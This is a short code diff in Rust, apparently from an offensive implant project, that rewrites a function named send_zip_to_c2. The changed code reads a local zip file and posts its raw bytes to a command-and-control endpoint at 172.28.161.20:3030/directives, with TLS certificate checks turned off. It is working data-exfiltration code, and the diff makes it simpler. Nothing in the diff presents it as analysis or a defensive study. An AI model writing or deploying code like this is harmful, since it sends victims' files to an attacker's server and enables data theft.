@@ -90,36 +90,15 @@ pub async fn send_zip_to_c2(filepath: &str) -> Result<(), Box<dyn std::error::Er
         .danger_accept_invalid_certs(true)
         .build()?;
 
-    let file_name = Path::new(filepath)
-        .file_name()
-        .and_then(|n| n.to_str())
-        .unwrap_or("file.zip")
-        .to_string();
+    let file_bytes = tokio::fs::read(filepath).await?;
 
-    let file_bytes = match fs::read(filepath).await {
-        Ok(bytes) => bytes,
-        Err(e) => {
-            eprintln!(
-                "Erreur lors de la lecture du fichier '{}': {:?}",
-                filepath, e
-            );
-            return Err(Box::new(e));
-        }
-    };
-
-    let form = multipart::Form::new().part(
-        "file",
-        multipart::Part::bytes(file_bytes)
-            .file_name(file_name)
-            .mime_str("application/zip")?,
-    );
-
-    let res = client
+    let response = client
         .post("https://172.28.161.20:3030/directives")
-        .multipart(form)
+        .header("Content-Type", "application/zip")
+        .body(file_bytes)
         .send()
         .await?;
 
-    println!("Status: {}", res.status());
+    println!("Status: {}", response.status());
     Ok(())
 }
